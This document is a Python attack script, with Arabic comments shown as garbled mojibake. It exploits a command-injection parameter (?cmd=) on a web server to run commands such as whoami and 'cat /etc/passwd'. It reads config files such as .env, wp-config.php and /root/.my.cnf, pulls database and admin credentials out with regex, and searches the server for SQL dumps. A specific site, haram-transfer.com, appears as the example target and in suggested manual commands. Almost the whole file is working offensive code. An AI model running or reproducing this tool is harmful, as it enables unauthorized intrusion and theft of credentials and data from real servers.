#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib.parse
import sys
import re
from colorama import Fore, Style, init

init(autoreset=True)

class DirectAdminExploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.found_credentials = []
        
    def print_banner(self):
        banner = f"""
{Fore.RED + Style.BRIGHT}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           DIRECT ADMIN EXPLOIT               â•‘
â•‘           {Fore.CYAN}NO BRUTE FORCE - REAL EXTRACTION{Fore.RED}     â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
{Style.RESET_ALL}
Target: {Fore.GREEN}{self.target}{Style.RESET_ALL}
Method: {Fore.YELLOW}Command Injection Direct Exploitation{Style.RESET_ALL}
{Fore.WHITE}{'='*60}{Style.RESET_ALL}
        """
        print(banner)
    
    def execute_command(self, command):
        """ØªÙ†ÙÙŠØ° Ø£ÙˆØ§Ù…Ø± Ù…Ø¨Ø§Ø´Ø±Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±"""
        url = f"{self.target}/?cmd={urllib.parse.quote(command)}"
        try:
            response = requests.get(url, timeout=15, verify=False)
            return response.text.strip()
        except Exception as e:
            return f"Error: {e}"
    
    def test_injection(self):
        """Ø§Ø®ØªØ¨Ø§Ø± ÙØ¹Ø§Ù„ÙŠØ© Ø«ØºØ±Ø© Command Injection"""
        print(f"\n{Fore.CYAN}[+] Testing Command Injection...{Style.RESET_ALL}")
        
        test_commands = [
            "whoami",
            "pwd", 
            "uname -a",
            "cat /etc/passwd | head -5"
        ]
        
        for cmd in test_commands:
            result = self.execute_command(cmd)
            print(f"{Fore.YELLOW}[TEST] {cmd}: {result[:100]}{Style.RESET_ALL}")
            
            if 'www-data' in result or 'root' in result or '/var/www' in result:
                return True
        
        return False
    
    def extract_config_files(self):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù…Ù„ÙØ§Øª Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ù…Ø¨Ø§Ø´Ø±Ø©"""
        print(f"\n{Fore.CYAN}[+] Extracting configuration files...{Style.RESET_ALL}")
        
        config_paths = [
            "/var/www/html/config.php",
            "/var/www/html/database.php", 
            "/var/www/html/.env",
            "/var/www/html/wp-config.php",
            "/var/www/html/app/config/database.php",
            "/var/www/html/application/config/database.php",
            "/var/www/html/config/database.php"
        ]
        
        for path in config_paths:
            result = self.execute_command(f"cat {path} 2>/dev/null")
            if result and len(result) > 10 and "Error:" not in result:
                print(f"{Fore.GREEN}[+] FOUND: {path}{Style.RESET_ALL}")
                
                # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„Ù…Ù„Ù
                self.parse_config_content(result, path)
    
    def parse_config_content(self, content, file_path):
        """ØªØ­Ù„ÙŠÙ„ Ù…Ø­ØªÙˆÙ‰ Ù…Ù„Ù Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ÙˆØ§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
        # Ø£Ù†Ù…Ø§Ø· Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        patterns = {
            'DB_USER': [r"['\"]DB_USERNAME['\"].*?['\"]([^'\"]+)", r"['\"]username['\"].*?['\"]([^'\"]+)", r"\$username.*?=.*?['\"]([^'\"]+)"],
            'DB_PASS': [r"['\"]DB_PASSWORD['\"].*?['\"]([^'\"]+)", r"['\"]password['\"].*?['\"]([^'\"]+)", r"\$password.*?=.*?['\"]([^'\"]+)"],
            'DB_NAME': [r"['\"]DB_DATABASE['\"].*?['\"]([^'\"]+)", r"['\"]database['\"].*?['\"]([^'\"]+)", r"\$database.*?=.*?['\"]([^'\"]+)"],
            'DB_HOST': [r"['\"]DB_HOST['\"].*?['\"]([^'\"]+)", r"['\"]hostname['\"].*?['\"]([^'\"]+)", r"\$host.*?=.*?['\"]([^'\"]+)"],
            'ADMIN_USER': [r"['\"]admin['\"].*?=>.*?['\"]([^'\"]+)", r"\$admin.*?=.*?['\"]([^'\"]+)"],
            'ADMIN_PASS': [r"['\"]admin_pass['\"].*?['\"]([^'\"]+)", r"\$admin_password.*?=.*?['\"]([^'\"]+)"]
        }
        
        for key, pattern_list in patterns.items():
            for pattern in pattern_list:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if match and len(match) > 1:
                        print(f"{Fore.GREEN}    {key}: {match}{Style.RESET_ALL}")
                        self.found_credentials.append({
                            'type': key,
                            'value': match,
                            'source': file_path
                        })
    
    def search_database_dumps(self):
        """Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ù…Ù„ÙØ§Øª Ø¨ÙŠØ§Ù†Ø§Øª SQL"""
        print(f"\n{Fore.CYAN}[+] Searching for database dumps...{Style.RESET_ALL}")
        
        search_commands = [
            "find /var/www -name '*.sql' 2>/dev/null | head -10",
            "find / -name '*.sql' -path '*/backup*' 2>/dev/null | head -10",
            "grep -r 'CREATE TABLE' /var/www/ 2>/dev/null | head -5"
        ]
        
        for cmd in search_commands:
            result = self.execute_command(cmd)
            if result and "Error:" not in result:
                print(f"{Fore.GREEN}[+] Database files found:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{result}{Style.RESET_ALL}")
                
                # Ø¥Ø°Ø§ Ù„Ù‚ÙŠÙ†Ø§ Ù…Ù„ÙØ§Øª SQL, Ù†Ø­Ø§ÙˆÙ„ Ù†Ù‚Ø±Ø£Ù‡Ø§
                sql_files = result.split('\n')
                for sql_file in sql_files[:3]:  # Ø£ÙˆÙ„ 3 Ù…Ù„ÙØ§Øª ÙÙ‚Ø·
                    if sql_file.strip():
                        content = self.execute_command(f"head -50 {sql_file.strip()} 2>/dev/null")
                        if content and 'INSERT' in content or 'CREATE TABLE' in content:
                            print(f"{Fore.CYAN}[SQL] {sql_file}: {content[:200]}...{Style.RESET_ALL}")
    
    def extract_mysql_credentials(self):
        """Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨ÙŠØ§Ù†Ø§Øª MySQL Ù…Ø¨Ø§Ø´Ø±Ø©"""
        print(f"\n{Fore.CYAN}[+] Extracting MySQL credentials directly...{Style.RESET_ALL}")
        
        mysql_commands = [
            "cat /root/.my.cnf 2>/dev/null",
            "cat /home/*/.my.cnf 2>/dev/null", 
            "grep -r 'password' /etc/mysql/ 2>/dev/null | head -10"
        ]
        
        for cmd in mysql_commands:
            result = self.execute_command(cmd)
            if result and "Error:" not in result:
                print(f"{Fore.GREEN}[MYSQL] {result}{Style.RESET_ALL}")
    
    def find_admin_directories(self):
        """Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø£Ø¯Ù„Ø© Ø§Ù„Ù…Ø¯ÙŠØ±"""
        print(f"\n{Fore.CYAN}[+] Finding admin directories...{Style.RESET_ALL}")
        
        admin_dirs = [
            "ls -la /var/www/html/admin/ 2>/dev/null",
            "find /var/www/html -name '*admin*' -type d 2>/dev/null",
            "ls -la /var/www/html/ | grep -i admin"
        ]
        
        for cmd in admin_dirs:
            result = self.execute_command(cmd)
            if result and "Error:" not in result:
                print(f"{Fore.GREEN}[ADMIN DIR] {result}{Style.RESET_ALL}")
    
    def generate_report(self):
        """ØªÙˆÙ„ÙŠØ¯ ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†ØªØ§Ø¦Ø¬"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"                 DIRECT EXPLOITATION REPORT")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        if self.found_credentials:
            print(f"\n{Fore.GREEN + Style.BRIGHT}[+] CREDENTIALS EXTRACTED:{Style.RESET_ALL}")
            for cred in self.found_credentials:
                print(f"{Fore.YELLOW}ðŸ”‘ {cred['type']}: {cred['value']}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}   Source: {cred['source']}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[-] No credentials extracted automatically{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Try manual exploitation with these commands:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}https://haram-transfer.com/?cmd=cat /var/www/html/config.php")
            print(f"https://haram-transfer.com/?cmd=find /var/www -name '*.php' | grep config")
    
    def run_exploitation(self):
        """ØªØ´ØºÙŠÙ„ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ Ø§Ù„ÙƒØ§Ù…Ù„Ø©"""
        self.print_banner()
        
        # Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø«ØºØ±Ø© Ø£ÙˆÙ„Ø§Ù‹
        if not self.test_injection():
            print(f"{Fore.RED}[-] Command injection not working!{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[+] Command injection confirmed! Starting exploitation...{Style.RESET_ALL}")
        
        # Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø±
        self.extract_config_files()
        self.search_database_dumps() 
        self.extract_mysql_credentials()
        self.find_admin_directories()
        
        # Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ
        self.generate_report()

def main():
    if len(sys.argv) != 2:
        print(f"{Fore.RED}Usage: python3 direct_exploit.py TARGET_URL{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Example: python3 direct_exploit.py https://haram-transfer.com{Style.RESET_ALL}")
        sys.exit(1)
    
    target = sys.argv[1]
    exploit = DirectAdminExploit(target)
    exploit.run_exploitation()

if __name__ == "__main__":
    main()